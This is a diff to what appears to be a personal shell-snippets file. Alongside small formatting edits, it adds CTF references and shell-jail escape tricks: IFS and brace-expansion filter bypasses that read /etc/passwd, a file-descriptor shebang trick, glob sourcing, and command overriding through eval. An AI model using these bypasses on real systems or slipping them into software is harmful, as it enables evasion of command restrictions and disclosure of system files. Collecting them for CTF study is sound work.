@@ -33,7 +33,6 @@ paste <(
 # - http://www.gibney.de/the_output_of_linux_pipes_can_be_indeter
 
 # Sum times skipping builtins
-
 seq 2 | \
   xargs -i env TIME="%e" time sh -c 'sleep 2' 2>&1 | \
   awk '{s+=$1} END {printf "%.0f", s}'
@@ -41,7 +40,6 @@ seq 2 | \
 # Create directories without permissions race condition
 # Reference: man 2 umask
 # Yak shave: https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=304556
-
 log_dir=
 old_umask=$(umask)
 umask 077
@@ -222,11 +220,21 @@ unalias ssh
 eval 'ssh() { :; }'
 
 # jail
+# - Process opens shell: reuse file descriptor 
+#     - #!/dev/fd/3\ncat <&9
+#     - [CTFtime\.org / ALLES! CTF 2020 / shebang / Writeup](https://ctftime.org/writeup/23281)
+# - [CTFtime\.org / ALLES! CTF 2020 / Bashell](https://ctftime.org/task/12955)
+#     - ~/share/ctf/alles2020/solutions/bashell.py
+# - https://hack.more.systems/writeup/2017/12/30/34c3ctf-minbashmaxfun/
 # - https://github.com/w181496/Web-CTF-Cheatsheet#%E7%A9%BA%E7%99%BD%E7%B9%9E%E9%81%8E
+# - https://github.com/trichimtrich/bashfuck
 cat$IFS$*flag
 cat</etc/passwd
 {cat,/etc/passwd}
 X=$'cat\x20/etc/passwd'&&$X
 IFS=,;`cat<<<uname,-a`
-
-
+# - Source foo
+. ???
+# - Given name=id, overrides command `id`
+#     - [CTFtime\.org / FwordCTF 2020 / Bash is fun](https://ctftime.org/task/12928)
+eval "function $name { :; }"; export -f "$name"
